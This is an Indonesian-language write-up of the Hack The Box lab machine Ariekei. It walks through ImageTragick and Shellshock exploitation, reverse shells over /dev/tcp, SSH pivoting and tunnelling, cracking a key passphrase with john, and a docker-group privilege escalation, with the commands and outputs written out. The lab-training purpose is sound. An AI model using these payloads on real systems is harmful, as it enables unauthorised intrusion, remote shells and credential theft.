## **Informasi Mesin**
- **Nama**: Ariekei
- **Sistem Operasi**: Linux
- **Tingkat Kesulitan**: Insane
- **Alamat IP**: 10.10.10.65
## **Tahap Reconnaissance**

### **Pemindaian Jaringan**

```bash
nmap -sC -sV -p- 10.10.10.65

- **22/tcp**: OpenSSH 7.2p2 (Ubuntu 16.04)
    
- **443/tcp**: nginx 1.10.2
    
- **1022/tcp**: OpenSSH 6.6.1p1
```


### **SSL Certificate Analysis**

Dari sertifikat SSL ditemukan Subject Alternative Name (SAN):

- `beehive.ariekei.htb`
    
- `calvin.ariekei.htb`
    

## **Tahap Enumerasi**

### **Domain Analysis**

#### **beehive.ariekei.htb**

- Hanya menampilkan halaman maintenance
    
- Terdapat path `/cgi-bin/stats` → berpotensi vulnerable terhadap Shellshock
    
- Request diblokir oleh WAF
    

#### **calvin.ariekei.htb**

- Terdapat fitur file upload
    
- Menggunakan ImageMagick (Wand untuk Python)
    
- Rentan terhadap ImageTragick (CVE-2016-3714)
    

## **Eksploitasi Awal - Container Escape**

### **ImageTragick Exploit (CVE-2016-3714)**

Membuat payload MVG:
```bash
cat > greed.mvg <<'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://dummy/";bash -i >& /dev/tcp/10.10.14.24/4444 0>&1;#)'
pop graphic-context
EOF
```

Upload `greed.mvg` → berhasil mendapatkan reverse shell sebagai root di container `convert-live` (172.23.0.11).

## **Pivoting dan Enumerasi Container**

### **Analisis Jaringan Docker**

File `info.png` ternyata dalam format WebP:

```bash
mv info.png info.webp
convert info.webp info.png
```

Hasil konversi mengungkap topologi jaringan Docker:

**Topologi:**

- Host (10.10.10.65)
    
- bastion-live (172.24.0.253)
    
- beehive-test (172.24.0.2)
    
- waf-live (172.23.0.252)
    
### **Mount Point Analysis**

Teridentifikasi mount `/common` yang berisi:

- `.secrets` → berisi `bastion_key` (SSH private key)
    
- `network/` → berisi `make_nets.sh` dan `info.png`
    

### **SSH Bastion Access**

Menggunakan key dari `.secrets`:
```bash
ssh -i bastion.key \
  -o PubkeyAcceptedAlgorithms=+ssh-rsa \
  -o HostKeyAlgorithms=+ssh-rsa \
  root@10.10.10.65 -p 1022
```

Berhasil login → akses root di bastion container.

### **SSH Tunneling**
```bash
ssh -i bastion.key \
  -o PubkeyAcceptedAlgorithms=+ssh-rsa \
  -o HostKeyAlgorithms=+ssh-rsa \
  root@10.10.10.65 -p 1022 -R 4443:10.10.14.24:443
```

## **Eksploitasi Shellshock**

### **Beehive Container Access**

Setelah berada di jaringan internal (belakang firewall), akses ke `172.24.0.2/cgi-bin/stats`.

**Uji RCE:**
```bash
wget -U '() { :;}; echo; /usr/bin/id' -O- http://172.24.0.2/cgi-bin/stats
```

**Output:**
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### **Reverse Shell**
```bash
wget -U '() { :;}; /bin/bash -i >& /dev/tcp/172.24.0.253/4443 0>&1' \
  -O- http://172.24.0.2/cgi-bin/stats
```

## **User Flag**

### **SSH Key Discovery dan Cracking**

Di container beehive, ditemukan `id_rsa` milik user `spanishdancer`.

**Crack Passphrase:**
```bash
ssh2john spanishdancer.key > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Hasil:** `purple1`

### **SSH Login**
```bash
ssh -i spanishdancer.key \
  -o PubkeyAcceptedAlgorithms=+ssh-rsa \
  -o HostKeyAlgorithms=+ssh-rsa \
  spanishdancer@10.10.10.65
```

User flag berhasil diperoleh.

## **Privilege Escalation**

### **Docker Group Analysis**

```bash
groups spanishdancer
```

**Output:** `spanishdancer : docker`

User memiliki akses ke Docker group → dapat menjalankan container dengan akses host.

### **Host Access via Docker**

```bash
docker run -v /:/mnt -it bash bash
```

Sekarang memiliki akses penuh ke host machine.

### **Root Flag**
```bash
cat /mnt/root/root.txt
```

Root flag berhasil diperoleh.

## **Kesimpulan**

Mesin Ariekei HTB merupakan mesin dengan tingkat kesulitan insane yang menguji kemampuan dalam exploitasi vulnerability chain, container escape, dan network pivoting. Kombinasi kerentanan klasik seperti ImageTragick dan Shellshock dengan miskonfigurasi Docker menciptakan attack surface yang kompleks namun realistic dalam environment containerized modern.